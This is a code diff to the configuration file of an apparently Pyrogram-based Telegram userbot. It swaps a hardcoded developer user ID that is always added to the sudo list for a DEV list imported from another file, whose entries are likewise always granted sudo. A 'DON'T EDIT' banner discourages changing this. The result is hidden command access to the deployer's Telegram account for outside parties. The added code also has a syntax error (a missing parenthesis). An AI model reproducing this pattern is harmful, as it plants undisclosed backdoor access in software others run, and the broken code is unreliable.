@@ -3,7 +3,7 @@ import os
 import re
 import sys
 from os import getenv
-
+from resources.data import DEV
 from dotenv import load_dotenv
 from pyrogram import filters
 
@@ -28,19 +28,34 @@ STRING7 = getenv("STRING_SESSION7", None)
 STRING8 = getenv("STRING_SESSION8", None)
 STRING9 = getenv("STRING_SESSION9", None)
 STRING10 = getenv("STRING_SESSION10", None)
-LOG_ID = getenv("LOG_ID", None) 
-OWNER_ID = getenv("OWNER_ID", None)
+OWNER_ID = int(getenv("OWNER_ID", "")
+SUDO_USERS = getenv("SUDO_USER") 
 
 
-# USERBOT ADMINS AND OWNER
+"""
+------------------------------DON'T EDIT AFTER THIS LINE---------------------------------------
+"""
 
-SUDO_USERS = list(map(int, getenv("SUDO_USER", "5256676062").split()))
-if 5256676062 not in SUDO_USERS: 
-    SUDO_USERS.append(5256676062)
+# CONVERTING STR TO INT
+
+def make_int(str_input):
+    str_list = str_input.split(" ")
+    int_list = []
+    for x in str_list:
+        int_list.append(int(x))
+    return int_list
 
 
-#DON'T EDIT OR MESS WITH CODES
 
-SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5256676062)
-SUDOERS = SUDO_USERS
+
+# SUDO SETUP
+
+SUDOERS = []
+
+if SUDO_USERS:
+    SUDOERS = make_int(SUDO_USERS)
+
+DEVS = DEV
+for i in DEVS:
+    SUDOERS.append(i)
+    SUDOERS.append(OWNER_ID)
